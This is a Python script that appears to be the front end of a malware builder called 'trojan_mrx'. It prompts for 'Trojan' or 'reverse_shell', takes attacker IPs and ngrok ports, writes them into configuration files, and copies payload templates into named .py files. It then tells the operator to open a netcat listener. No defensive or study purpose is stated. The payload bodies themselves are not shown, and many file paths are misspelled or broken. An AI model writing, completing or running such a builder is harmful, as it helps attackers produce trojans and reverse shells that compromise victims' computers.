import os
import socket
login=os.getlogin()
try:
    os.mkdir("C://Users//MRX")
    #os.chdir("C://Users//MRX")

except:
    #os.chdir("C://Users//MRX")
    pass

type_v="nothing"
os.system("cls")
trojan_word=["trojan",'1','TROJAN',"Trojan"]
reverse_shell_word=["2","reverse_shell","Reverse_Shell","REVERSE_SHELL"]
while True:
    payload_type=input("""Chose The Type Of Your Virus :
 1) Trojan
 2) reverse_shell
 >> """)

    if str(payload_type) in trojan_word:
        type_v=True
        break
    if str(payload_type) in reverse_shell_word:
        type_v=False
        break

    else:
        os.system("cls")
        continue

if type_v == True:
    while True:
        local_or_=input("\n You Use an public ip addresse or an local ip (local/public) >> ")
        if str(local_or_) =="public":
            ip=input(" Enter The Ip >> ")
            port1=input(" The Local Port Not of ngrok >> ")
            port2=input(" Enter The Public Port (of ngrok) >> ")
            file=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan_licen//ip.txt",'w');file.write("127.0.0.1");file.close()
            file2=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan_licen//port.txt",'w');file2.write(f'{port1}');file2.close()
            file_1=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//ip.txt","w");file_1.write(f'{ip}');file_1.close()
            file_2=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//port.txt","w");file_2.write(f'{port2}');file_2.close()
            file_name=input(" Enter The File Name for license >> ")
            trojan_name=input(" Enter The Pyload name >> ")
            os.startfile("C://Users//"+str(login)+"//Downloads//trojan_mrx//creator.py")
            trojan_source_code_public=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//creator.txt","r").read()
            virus_source_code_public=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//payload_virus.txt",'r').read()
            fiel_finall=open(f"C://Users//"+str(login)+f"Downloads//trojan_mrx//payload//{trojan_name}.py","w").write(str(virus_source_code_public))
            creator=open("C://Users//"+str(login)+f"//Downloads//trojan_mrx//payload//{file_name}.py","w");creator.write(str(trojan_source_code_public));creator.close()
            print(R"The license File Was Created in >> C://Users//"+str(login)+"//Downloads//trojan_mrx//payload"+str(file_name)+str(".py"))
            print(R'The Trojan File Was Saved In >> C://Users//'+str(login)+"//Downloads//trojan_mrx//payload"+str(trojan_name)+str(".py"))
            os.system("pause");break

        if str(local_or_) == "local":
            ip=input(" Enter The ip >> ")
            port=input(" Enter The Port >> ")
            file=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//ip.txt",'w');file.write(f'{ip}');file.close()
            file2=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//port.txt",'w');file2.write(f'{port}');file2.close()
            file_name=input(" Enter The File Name for license >> ")
            trojan_name=input(" Enter The Payload Name >> ")
            file1=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//creator.txt","r").read()
            file_01=open("C://Users//"+str(login)+f"//Downloads//trojan_mrx//payload//{file_name}.py","w").write(str(file1))
            os.startfile("C://Users//"+str(login)+"//Downloads//trojan_mrx//creator_2.py")
            file000=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//payload_virus.txt","r").read()
            file_r=open(f"C://Users//MRX//payload//{trojan_name}.py","w").write(str(file000))
            print(R"The license File Was Created in >> C://Users//"+str(login)+"Donwloads//trojan_mrx//paylaod//"+str(file_name)+str(".py"))
            print(R'The Trojan File Was Saved In >> C://Users//'+str(login)+"//Downloads//trojan_mrx//payload//"+str(trojan_name)+str(".py"))
            fin_type=input("\n Do You Want Start The license File (y,n) >> ")
            yes=["y","Y"]
            n=["n","N"]
            if fin_type in yes:
                os.startfile("C://Users//"+str(login)+"//Downloads//trojan_mrx//paylaod//"+str(file_name)+str(".py"))
                os.system("pause");break
            if fin_type in n:
                os.system("pause");break
    
if type_v == False:
    local=input(" Do You Use An local ip Or Public (local , public) >> ")
    if local == "local":
        m=True
    if local == "public":
        m=False
        
    ip=input(" Enter The Ip >> ")
    if m == False:
        port1=input(" Enter The Local Port Not of (Ngrok) >> ")
        m=True

    if m == True:
        port=input(" Enter The Port >> ")
        w1=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//ip.txt","w");w1.write(ip);w1.close()
        w2=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//source//trojan//port.txt","w");w2.write(port);w2.close()
        os.startfile("C://Users//"+str(login)+"//Downloads//trojan_mrx//reverse.py")
        file_name=input(" Enter The Payload Name >> ")
        reader=open("C://Users//"+str(login)+"//Downloads//trojan_mrx//reverse_shell.txt",'r').read()
        open(f"C://Users//"+str(login)+f"//Downloads//trojan_mrx//payload//{file_name}.py","w").write(str(reader))
        print(R" The File Name Was Savedc In c:\Users"+str(login)+R"\Downloads\trojan_mrx\payload\\"+str(file_name)+str(".py"))
        print(f" You Need To Get A linux OS to run The reverse_shell Do in terminal nc -lvnp {port} ")
        os.system("pause")